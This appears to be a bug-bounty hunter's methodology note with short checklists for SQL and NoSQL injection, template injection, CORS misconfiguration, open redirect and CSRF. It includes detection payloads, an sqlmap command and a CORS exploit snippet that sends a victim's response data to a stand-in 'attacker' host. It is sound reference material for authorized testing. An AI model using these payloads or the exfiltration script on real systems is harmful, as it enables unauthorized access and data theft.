> [!abstract] Module: [[4-Methodology/Crow-Hustler/hunter-methodology-V1/hunting/00-index|← Back to Hunting]]

# Other Bug Classes

## SQLi

Hunt in: login, search, filters, sort, numeric IDs, cookies, second-order (profile names).

1. Detect: Boolean (`AND 1=1` vs `AND 1=2`), Time (`SLEEP(5)`), Error (single quote → 500)
2. Identify: column count via `ORDER BY`
3. Extract: union, blind, OOB
4. NoSQL: `{"$ne":1}`, `{"$gt":""}`, `{"$regex":".*"}`
5. Tool: `sqlmap -u ... --batch --dbs`

## SSTI

Detect: `{{7*7}}` returns 49? Template-engine fingerprint → exploit.
PayloadsAllTheThings for per-engine payloads (Twig, Jinja2, Freemarker, etc.)

## CORS

Server echoes `Origin: <whatever>` into `ACAO` + `ACAC: true`:
```javascript
var req = new XMLHttpRequest();
req.onload = function() { location='//attacker/log?key='+this.responseText; };
req.open('get','https://vulnerable/sensitive-data',true);
req.withCredentials = true;
req.send();
```

**Null origin bypass**: sandbox iframe → `Origin: null` accepted.

## Open Redirect

Chain into ATO, SSRF protection bypass. Check `window.location`, `location.assign`, `window.open`, `<a href="javascript:...">`.

## CSRF

Causes: cookie-based session + privileged action + no anti-CSRF token.
Test: Token validation (missing, not tied, empty accepted), SameSite, Origin/Referer check.
Probe both GET and POST versions.
